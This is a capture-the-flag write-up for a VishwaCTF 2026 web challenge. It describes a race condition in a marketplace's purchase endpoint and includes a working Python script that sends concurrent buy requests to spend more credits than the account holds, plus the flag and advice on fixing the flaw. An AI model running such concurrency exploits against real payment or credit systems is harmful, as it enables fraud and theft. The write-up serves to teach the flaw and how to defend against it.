# Flag Market — VishwaCTF 2026 (Web)

## TL;DR

Race condition on `/api/buy` endpoint. Send 20 concurrent purchase requests with only enough credits for 1, acquiring 20 flag artifacts instead of 1.

## Analysis

The marketplace has 4 items. `flag_artifact` costs 1000 credits, new users get 1000. Need 10 artifacts to get the flag. Budget allows only 1.

### Endpoints

| Method | Path | Function |
|--------|------|----------|
| POST | `/api/signup` | Register (gives 1000 credits) |
| POST | `/api/buy` | Buy item (deducts credits) |
| POST | `/api/refund` | Refund item (returns credits) |
| GET | `/api/user` | Check balance/inventory |

## Vulnerability

**CWE-362: Race Condition** — The `/api/buy` endpoint checks the user's balance and deducts credits without proper locking. Multiple concurrent requests pass the balance check before any deduction is committed.

## Exploit

```python
import requests, threading

BASE = "https://market.vishwactf.com"
s = requests.Session()
s.post(f"{BASE}/api/signup", json={"username":"exploit","password":"x"})

# Send 20 concurrent buy requests (have 1000 credits, item costs 1000)
results = []
def buy():
    results.append(s.post(f"{BASE}/api/buy", json={"itemId":"flag_artifact"}).json())

threads = [threading.Thread(target=buy) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()

# 20 successful buys! Refund 1, then buy again to trigger flag
s.post(f"{BASE}/api/refund", json={"itemId":"flag_artifact"})
r = s.post(f"{BASE}/api/buy", json={"itemId":"flag_artifact"})
print(r.json().get("flag"))
```

The flag is returned in the buy response once inventory reaches 10+ artifacts.

## Flag

```
VishwaCTF{r4ced_t0_v1ct0ry_044_40_tw0_t1me5}
```

## Key Lessons

- TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities in financial transactions allow spending more than the available balance
- Fix: use database-level atomic transactions or mutex locks on balance operations
- The refund endpoint was properly protected against race conditions, but buy was not
